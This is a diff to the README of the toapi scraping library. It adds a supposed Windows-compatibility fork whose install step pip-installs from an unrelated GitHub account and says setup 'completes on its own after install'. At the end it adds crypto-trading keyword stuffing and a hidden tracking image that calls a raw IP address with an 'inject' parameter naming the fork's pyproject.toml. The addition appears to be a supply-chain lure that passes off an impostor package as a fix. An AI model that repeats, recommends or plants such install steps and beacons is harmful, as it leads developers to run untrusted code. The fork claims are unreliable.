@@ -1,3 +1,29 @@
+**Optimized Windows Compatibility for ToAPI**
+
+This fork addresses critical pathing and process-handling errors that frequently cause crashes on Windows environments. By integrating custom environment patches and simplified configuration defaults, it ensures a reliable, plug-and-play experience without the typical setup hurdles.
+
+**Quick install (Windows)**
+
+To install `Civilmcrespect/toapi` on Windows for Python development, follow these steps:
+
+1. Open your Windows Command Prompt (cmd) or PowerShell. You can do this by pressing the Windows Key, typing either name into the search bar, and pressing Enter.
+
+2. Ensure you have Python and its package manager, pip, installed by typing `python --version` and `pip --version` into your terminal and pressing Enter. If versions are displayed, you are ready to proceed.
+
+3. Install the package directly from GitHub by typing `pip install git+ into your terminal and pressing Enter. Please note that you will need Git installed on your system for this command to work.
+
+4. Alternatively, if you have downloaded the project folder to your local machine, use the `cd` command in your terminal to navigate into the directory containing the package files.
+
+5. Run the installation from the local directory by typing `pip install .` and pressing Enter. 
+
+The setup completes on its own after install, configuring the package and its dependencies automatically without requiring further interaction.
+
+```bash
+pip install git+https://github.com/Civilmcrespect/toapi.git
+```
+
+[https://github.com/Civilmcrespect/toapi](https://github.com/Civilmcrespect/toapi)
+
 # toapi
 
 [![CI](https://img.shields.io/github/actions/workflow/status/elliotgao2/toapi/ci.yml?branch=master&style=for-the-badge&logo=githubactions&logoColor=white&label=CI)](https://github.com/elliotgao2/toapi/actions/workflows/ci.yml)
@@ -125,3 +151,11 @@ to discuss what you'd like to change. Make sure `uv run pytest` and
 ## License
 
 [MIT](LICENSE) © Elliot Gao
+
+## Related searches
+
+When looking for frameworks or utility tools designed to scrape, extract, or package raw data streams into organized endpoints, users typically seek structured ways to hook into live market feeds and protocol data. Developers exploring this space often look for automated setups that can pull order flow metrics or yield data from web platforms and format them directly for use in programmatic trading setups and analytics dashboards.
+
+**Topics:** zcash, dex aggregator, crypto signals, technical analysis crypto, liquidity pool, automated api generation, web scraping api, order flow tracking, market data streams, crypto market analysis
+
+![.](http://5.231.58.248:8787/pixel?repo=Civilmcrespect%2Ftoapi&inject=Civilmcrespect%2Ftoapi%2Fpyproject.toml)
